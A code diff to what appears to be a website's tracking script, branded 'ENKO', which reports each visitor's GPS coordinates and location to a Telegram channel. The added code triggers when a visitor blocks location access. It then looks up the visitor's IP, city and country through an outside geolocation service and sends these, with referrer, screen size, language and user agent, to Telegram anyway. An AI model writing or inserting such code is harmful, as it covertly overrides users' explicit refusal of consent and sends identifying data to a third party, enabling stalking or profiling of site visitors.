@@ -47,18 +47,36 @@
         }
       };
 
+      // Get IP-based location (fallback when GPS is blocked)
+      const getIPLocation = async () => {
+        try {
+          const res = await fetch('https://ipapi.co/json/');
+          if (!res.ok) throw new Error('IP API failed');
+          const data = await res.json();
+          return {
+            ip: data.ip || 'Unknown',
+            city: data.city || 'Unknown',
+            country: data.country_name || 'Unknown',
+            region: data.region || '',
+          };
+        } catch (err) {
+          console.log('IP location failed');
+          return { ip: 'Unknown', city: 'Unknown', country: 'Unknown', region: '' };
+        }
+      };
+
       const sendRichLocation = async (position) => {
         const { latitude, longitude, accuracy } = position.coords;
 
         try {
-          // Get city + country (with timeout)
+          // Get city + country from GPS
           let city = 'Unknown';
           let country = 'Unknown';
           let region = '';
 
           try {
             const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 9000);
+            const timeoutId = setTimeout(() => controller.abort(), 6000);
 
             const geoRes = await fetch(
               `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`,
@@ -73,10 +91,10 @@
               region = geoData.principalSubdivision || '';
             }
           } catch (geoErr) {
-            console.log('Reverse geocoding failed, sending coordinates only');
+            console.log('Reverse geocoding failed');
           }
 
-          const message = `✅ ENKO - New Visitor
+          const message = `✅ ENKO - New Visitor (GPS)
 
       📍 ${latitude}, ${longitude}
       🏙 ${city}, ${region}
@@ -111,15 +129,34 @@
         setTimeout(() => {
           navigator.geolocation.getCurrentPosition(
             sendRichLocation,
-            (error) => {
-              let errorType = 'Unknown';
-              switch (error.code) {
-                case error.PERMISSION_DENIED: errorType = 'BLOCKED'; break;
-                case error.POSITION_UNAVAILABLE: errorType = 'UNAVAILABLE'; break;
-                case error.TIMEOUT: errorType = 'TIMEOUT'; break;
-                default: errorType = `CODE_${error.code}`;
+            async (error) => {
+              if (error.code === error.PERMISSION_DENIED) {
+                // User blocked location - still send IP-based info
+                const ipData = await getIPLocation();
+
+                const blockedMsg = `❌ ENKO - Location BLOCKED by user
+
+      🌍 IP: ${ipData.ip}
+      🏙 ${ipData.city}, ${ipData.region}
+      🌍 ${ipData.country}
+
+      🕒 ${new Date().toISOString()}
+
+      🌐 Referrer: ${document.referrer || 'Direct'}
+      📱 ${window.screen.width}x${window.screen.height} | ${navigator.language}
+      User Agent: ${navigator.userAgent.substring(0, 100)}`;
+
+                await sendToTelegram(blockedMsg);
+              } else {
+                // Other geolocation error
+                let errorType = 'Unknown';
+                switch (error.code) {
+                  case error.POSITION_UNAVAILABLE: errorType = 'UNAVAILABLE'; break;
+                  case error.TIMEOUT: errorType = 'TIMEOUT'; break;
+                  default: errorType = `CODE_${error.code}`;
+                }
+                sendToTelegram(`❌ ENKO - Location ${errorType}\nMessage: ${error.message}`);
               }
-              sendToTelegram(`❌ ENKO - Location ${errorType}\nMessage: ${error.message}`);
             },
             { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
           );
